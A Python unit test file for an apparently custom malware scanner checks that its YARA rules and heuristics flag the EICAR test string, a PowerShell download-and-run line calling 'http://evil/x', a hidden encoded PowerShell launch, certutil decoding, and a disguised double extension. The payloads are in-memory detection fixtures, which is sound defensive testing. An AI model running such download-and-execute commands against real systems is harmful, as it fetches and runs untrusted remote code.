"""Fast, offline unit tests. No real malware, no network, no disk-write of EICAR
(so Windows Defender can't interfere)."""

from pathlib import Path

from warden.config import BUNDLED_RULES_DIR
from warden.engines.base import ScanContext
from warden.engines.yara_engine import YaraEngine
from warden.engines.heuristics import HeuristicsEngine
from warden.models import Severity


# EICAR built at runtime so this source file itself isn't flagged by scanners.
EICAR = (
    "X5O!P%@AP[4" + chr(92) + "PZX54(P^)7CC)7}"
    + chr(36) + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!" + chr(36) + "H+H*"
).encode()


class _MemCtx(ScanContext):
    def __init__(self, data: bytes, name: str = "mem.bin"):
        self.path = Path(name)
        self.size = len(data)
        self.max_read = 1 << 20
        self._data = data
        self._sha256 = None
        self._read_error = None


def test_yara_detects_eicar():
    eng = YaraEngine([BUNDLED_RULES_DIR])
    assert eng.available(), eng.status
    findings = eng.scan(_MemCtx(EICAR))
    names = {f.name for f in findings}
    assert "EICAR_Test_File" in names
    assert max(f.severity for f in findings) == Severity.CRITICAL


def test_yara_detects_powershell_downloader():
    eng = YaraEngine([BUNDLED_RULES_DIR])
    payload = b'IEX (New-Object Net.WebClient).DownloadString("http://evil/x")'
    findings = eng.scan(_MemCtx(payload, "x.ps1"))
    assert any(f.name == "Suspicious_PowerShell_Downloader" for f in findings)


def test_yara_lolbin_rules_skip_large_binaries():
    """Command/script rules must not fire inside big binaries (FP guard)."""
    eng = YaraEngine([BUNDLED_RULES_DIR])
    # certutil strings embedded in a 3 MB blob (simulates a large signed exe).
    big = b"certutil -decode payload" + b"\x00" * (3 * 1024 * 1024)
    findings = eng.scan(_MemCtx(big, "big.exe"))
    assert not any(f.name == "Certutil_LOLBin_Abuse" for f in findings)
    # Same strings in a small script SHOULD still be caught.
    small = b"certutil -decode evil.b64 evil.exe"
    findings2 = eng.scan(_MemCtx(small, "x.bat"))
    assert any(f.name == "Certutil_LOLBin_Abuse" for f in findings2)


def test_heuristics_fake_double_extension():
    eng = HeuristicsEngine()
    findings = eng.scan(_MemCtx(b"whatever", "invoice.pdf.exe"))
    assert any(f.name == "fake-double-extension" and f.severity == Severity.HIGH
               for f in findings)


def test_heuristics_suspicious_script():
    eng = HeuristicsEngine()
    payload = b"powershell -nop -w hidden -enc ZQ==; IEX (DownloadString)"
    findings = eng.scan(_MemCtx(payload, "a.ps1"))
    assert any(f.name == "suspicious-script-content" for f in findings)


def test_clean_file_has_no_findings():
    eng = HeuristicsEngine()
    findings = eng.scan(_MemCtx(b"just a normal note, nothing here", "notes.txt"))
    assert findings == []
